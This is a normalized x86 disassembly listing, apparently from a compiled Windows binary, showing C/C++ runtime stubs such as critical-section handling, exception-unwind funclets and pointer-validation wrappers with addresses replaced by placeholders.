push 0x1
call sub_406694
pop ecx
retn
sub_406af0
push 0x9
call sub_406d76
pop ecx
retn
sub_406b48
push 0x9
call sub_406d76
pop ecx
retn
sub_406b6f
push esi
mov esi ecx
call sub_406c12
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40403c
pop ecx
sub_406c12
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_40403c
pop ecx
sub_406c28
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_406cec
push esi
mov esi [ InitializeCriticalSection@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
retn
sub_406e10
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_406f16
push rw-data
push rw-data
call sub_406f16
add esp 0x10
retn
call eax
sub_406e3d
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_406e5f
add esp 0xc
retn
sub_406e4e
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_406e5f
add esp 0xc
retn
sub_406f04
push 0xd
call sub_406d15
pop ecx
retn
sub_406f0d
push 0xd
call sub_406d76
pop ecx
retn
sub_4070bb
push 0x9
call sub_406d76
pop ecx
retn
sub_407209
push 0x9
call sub_406d76
pop ecx
xor edi edi
retn
sub_4072c9
push 0x9
call sub_406d76
pop ecx
retn
sub_407344
push 0x9
call sub_406d76
pop ecx
retn
sub_4073f2
push 0x9
call sub_406d76
pop ecx
retn
sub_407451
push 0x9
call sub_406d76
pop ecx
retn
sub_408163
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_408170
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_408180
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_408782
push [ ebp - 0x14 ]
call sub_4087b9
pop ecx
retn
sub_4087b9
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_408cfa
xor eax eax
retn
sub_4088ef
push [ ebp - 0x14 ]
call sub_408965
pop ecx
retn
sub_408b47
push 0x1
pop eax
retn
sub_408b4b
mov esp [ ebp - 0x18 ]
jmp sub_408cfa
sub_408ba9
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_408bb2
mov esp [ ebp - 0x18 ]
jmp sub_408cfa
sub_408c80
mov eax [ esp + 0x4 ]
mov [ eax + 0x50 ] rw-data
mov [ eax + 0x14 ] 0x1
retn
sub_408d42
push 0x1
pop eax
retn
sub_408d98
push 0x1
pop eax
retn
sub_408df7
push sub_408db1
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_408e08
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_409dc5
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_4057da
add esp 0x8
pop ebp
retn 0x4
sub_40a005
push 0x9
call sub_406d76
pop ecx
retn
sub_40a08e
push 0x9
call sub_406d76
pop ecx
retn
sub_40be24
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax * 4 + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_40c224
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40c240
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40c25c
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40c28b
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_40c29c
add esp 0xc
retn
sub_40c6a5
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_40c2cd
pop ecx
mov [ rw-data ] 0x1
sub_40c6c1
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40c6d8
add esp 0x10
retn
sub_40cc07
push 0x1
pop eax
retn
sub_40ce31
push 0x2
call sub_40623d
pop ecx
retn
sub_40d22e
push 0x1
pop eax
retn
sub_40d2e2
push 0x1
pop eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_40d68c
mov eax r--data
jmp sub_405541
sub_40d698
lea ecx [ ebp - 0x98 ]
jmp sub_4020a0
sub_40d6a3
lea ecx [ ebp - 0x88 ]
jmp sub_4020a0
sub_40d6ae
lea ecx [ ebp - 0x78 ]
jmp sub_4020a0
sub_40d6b6
lea ecx [ ebp - 0xa8 ]
jmp sub_4020a0
sub_40d6c1
lea ecx [ ebp - 0xa8 ]
jmp sub_4020a0
sub_40d6cc
mov eax r--data
jmp sub_405541
sub_40d6d8
mov eax r--data
jmp sub_405541
sub_40d6e4
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d6f4
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d704
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d714
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d724
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d734
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d744
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d754
mov eax r--data
jmp sub_405541
sub_40d760
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_4027da
sub_40d77a
mov eax r--data
jmp sub_405541
sub_40d784
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_4027da
sub_40d79e
mov eax r--data
jmp sub_405541
sub_40d7a8
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_4027da
sub_40d7c2
mov eax r--data
jmp sub_405541
sub_40d7cc
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_4027da
sub_40d7e6
mov eax r--data
jmp sub_405541
sub_40d7f0
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_402960
sub_40d7fb
mov ecx [ ebp - 0x10 ]
jmp sub_4029b1
sub_40d803
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_402960
sub_40d80e
mov eax r--data
jmp sub_405541
sub_40d818
mov ecx [ ebp - 0x10 ]
jmp sub_4029b1
sub_40d820
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_402960
sub_40d82b
mov eax r--data
jmp sub_405541
sub_40d838
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d848
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d858
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d868
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d878
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d888
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d898
push rw-data
push [ ebp - 0x10 ]
call sub_4026cd
pop ecx
pop ecx
retn
sub_40d8a8
mov eax r--data
jmp sub_405541
sub_40d8b4
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_4036aa
sub_40d8ce
mov eax r--data
jmp sub_405541
sub_40d8d8
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_4036aa
sub_40d8f2
mov eax r--data
jmp sub_405541
sub_40d8fc
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_4036aa
sub_40d916
mov eax r--data
jmp sub_405541
sub_40d920
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_4036aa
sub_40d93a
mov eax r--data
jmp sub_405541
sub_40d944
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_402960
sub_40d94f
mov ecx [ ebp - 0x10 ]
jmp sub_4037dc
sub_40d957
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_402960
sub_40d962
mov eax r--data
jmp sub_405541
sub_40d96c
mov ecx [ ebp - 0x10 ]
jmp sub_4037dc
sub_40d974
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_402960
sub_40d97f
mov eax r--data
jmp sub_405541
sub_40d98c
lea ecx [ ebp - 0x20 ]
jmp sub_4020a0
sub_40d994
mov eax r--data
jmp sub_405541
sub_40d9a0
mov ecx [ ebp - 0x14 ]
jmp sub_406c12
sub_40d9a8
mov eax r--data
jmp sub_405541
sub_40d9b4
mov ecx [ ebp - 0x10 ]
jmp sub_406c12
sub_40d9bc
mov eax r--data
jmp sub_405541
sub_40d9c8
mov ecx [ ebp - 0x10 ]
jmp sub_406c12
sub_40d9d0
mov eax r--data
jmp sub_405541
sub_40d9dc
mov ecx [ ebp - 0x10 ]
jmp sub_406c12
sub_40d9e4
mov eax r--data
jmp sub_405541
sub_40d9f0
lea ecx [ ebp - 0x20 ]
jmp sub_4020a0
sub_40d9f8
mov eax r--data
jmp sub_405541
sub_40da04
mov ecx [ ebp - 0x10 ]
jmp sub_406c12
sub_40da0c
mov eax r--data
jmp sub_405541
sub_40da18
lea ecx [ ebp - 0x1c ]
jmp sub_4020a0
sub_40da20
mov eax r--data
jmp sub_405541
sub_40da2c
mov ecx [ ebp - 0x14 ]
jmp sub_406c12
sub_40da34
mov eax r--data
jmp sub_405541
sub_40da40
mov ecx [ ebp - 0x10 ]
jmp sub_406c12
sub_40da48
mov eax r--data
jmp sub_405541
sub_40da54
mov ecx [ ebp - 0x10 ]
jmp sub_406c12
sub_40da5c
mov eax r--data
jmp sub_405541
sub_40da68
mov ecx [ ebp - 0x10 ]
jmp sub_406c12
sub_40da70
mov eax r--data
jmp sub_405541
sub_40da7c
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_402960
sub_40da87
mov eax r--data
jmp sub_405541
sub_40da94
lea ecx [ ebp - 0x10 ]
jmp sub_404439
sub_40da9c
push [ ebp - 0x14 ]
call sub_40403c
pop ecx
retn
sub_40daa6
mov eax r--data
jmp sub_405541
sub_40dab0
lea ecx [ ebp - 0x10 ]
jmp sub_404439
sub_40dab8
mov eax r--data
jmp sub_405541
sub_40dac4
mov ecx [ ebp - 0x10 ]
jmp sub_4049ac
sub_40dacc
mov eax r--data
jmp sub_405541
sub_40dad8
mov ecx [ ebp - 0x14 ]
jmp sub_4049ac
sub_40dae0
mov ecx [ ebp - 0x14 ]
add ecx 0x18
jmp sub_4020a0
sub_40daeb
lea ecx [ ebp - 0x10 ]
jmp sub_404439
sub_40daf3
mov eax r--data
jmp sub_405541
